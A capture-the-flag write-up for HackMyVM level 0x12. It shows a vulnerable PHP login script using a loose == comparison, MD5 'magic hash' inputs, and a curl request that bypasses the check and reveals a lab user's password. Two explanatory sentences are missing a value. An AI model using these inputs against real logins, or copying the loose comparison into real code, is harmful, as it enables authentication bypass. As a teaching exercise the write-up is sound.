# 0x12
This write-up explains the steps taken to complete mission 0x12 on hades@hackmyvm.eu, starting from user `asteria` and escalating to `astraea`.

## Mission
As always, we read the mission first:
```bash
asteria@hades:~$ cat mission.txt 
################
# MISSION 0x12 #
################

## EN ##
The user astraea believes in magic. 
```
The mission clue for this level provided a cryptic hint regarding "magic".

## Method of solving: PHP Type Juggling (Magic Hashes)
A backup file is found in the home directory, `sihiri_old.php`, revealed a PHP script using a vulnerable loose comparison for authentication.
```bash
asteria@hades:~$ cat sihiri_old.php 

<?php
$pass = hash('md5', $_GET['pass']);
$pass2 = hash('md5',"ASTRAEA_PASS");
if($pass == $pass2){
print("ASTRAEA_PASS");
}
else{
print("Incorrect ^^");
}
?>
```
The "magic" mentioned in the mission refers to **PHP Type Juggling**. When using the loose comparison operator (`==`), PHP treats strings that start with `0e` (followed only by numbers) as scientific notation (), which evaluates to `0`.

Using a known list of MD5 magic hashes or using the python script `asteria_generate_md5_hash.py` to find a value that starts with `0e`:
- **Payload**: 240610708, 314282422,...
- **MD5 Hash**: 0e462097431906509019562988736854, 0e990995504821699494520356953734,...

By sending this payload to the active script via `curl`, the comparison logic was bypassed, and the script printed the cleartext password for the user.
```bash
asteria@hades:~$ curl localhost/sihiri.php?pass=314282422

nZkEYtjvHElOtupXKzTE
```
**Explanation**:
- **Loose Comparison (`==`)**: This operator does not check for type identity. When it sees two strings that look like floats in scientific notation, it converts them both to, satisfying the `if` condition.
- **Magic MD5 hash**: Since the string `314282422` produces a hash starting with `0e`, it successfully matched the internal secret hash, which also followed the "magic" `0e` pattern.

Using the retrieved password, we successfully logged in to user `astraea` by SSH and get the flag.

## Key command
`curl localhost/sihiri.php?pass=314282422`


***You are welcome!***

